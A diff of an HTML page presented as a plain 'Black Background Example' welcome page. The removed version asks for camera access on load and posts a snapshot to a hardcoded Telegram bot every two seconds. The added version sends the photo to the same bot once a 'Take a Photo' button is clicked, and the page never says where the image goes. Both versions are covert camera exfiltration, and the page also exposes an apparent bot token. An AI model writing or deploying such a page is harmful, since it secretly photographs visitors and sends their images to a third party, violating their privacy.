@@ -1,79 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Black Background Example</title>
-  <style>
-    body {
-      background-color: black;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: Arial, sans-serif;
-    }
-    h1 {
-      text-align: center;
-      font-size: 3em;
-      text-shadow: 2px 2px 10px rgba(255, 255, 255, 0.5);
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Black Background Example</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            text-align: center;
+            font-size: 3em;
+            text-shadow: 2px 2px 10px rgba(255, 255, 255, 0.5);
+        }
+    </style>
 </head>
 <body>
-  <h1>Welcome to My Black Background Page</h1>
-  <script>
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        console.log("Camera permission granted");
-        startTakingPhotos(stream);
-      })
-      .catch(error => {
-        console.error("Camera permission denied", error);
-      });
+    <h1>Welcome to My Black Background Page</h1>
 
-    function startTakingPhotos(stream) {
-      setInterval(() => {
-        const canvas = document.createElement("canvas");
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext("2d");
-        
-        // Capture the video frame
-        ctx.drawImage(stream.getVideoTracks()[0].getSettings().facingMode === "user" ? stream.getVideoTracks()[0] : stream.getVideoTracks()[1], 0, 0, canvas.width, canvas.height);
-        
-        // Convert image to base64
-        const photo = canvas.toDataURL();
-        
-        // Send photo to Telegram chat
-        sendPhotoToTelegram(photo);
-      }, 2000); // 2 seconds
-    }
+    <!-- Button to request camera permission and take a photo -->
+    <button id="take-photo-btn">Take a Photo</button>
 
-    function sendPhotoToTelegram(photo) {
-      const chatId = "5112680061"; // Replace with your chat ID
-      const token = "6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es"; // Replace with your bot token
-      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
-      const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("photo", photo);
-      
-      fetch(url, {
-        method: "POST",
-        body: formData,
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (data.ok) {
-            console.log("Photo sent successfully", data);
-          } else {
-            console.error("Error sending photo", data.description);
-          }
-        })
-        .catch(error => console.error("Error sending photo", error));
-    }
-  </script>
+    <!-- Video element to display the camera feed -->
+    <video id="video" width="640" height="480"></video>
+
+    <!-- Canvas element to capture the photo -->
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        // Get the video and canvas elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // Get the button element
+        const takePhotoBtn = document.getElementById('take-photo-btn');
+
+        // Request camera permission and take a photo
+        takePhotoBtn.addEventListener('click', () => {
+            // Request camera permission
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    // Set the video source to the camera feed
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Take a photo when the video is playing
+                    video.addEventListener('playing', () => {
+                        // Draw the video frame on the canvas
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Get the photo as a blob
+                        canvas.toBlob(blob => {
+                            // Create a form data object to send the photo to Telegram
+                            const formData = new FormData();
+                            formData.append('photo', blob);
+
+                            // Send the photo to Telegram using the Telegram API
+                            fetch(`https://api.telegram.org/bot6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es/sendPhoto?chat_id=5112680061`, {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => console.log(data))
+                            .catch(error => console.error(error));
+                        });
+                    });
+                })
+                .catch(error => console.error(error));
+        });
+    </script>
 </body>
 </html>
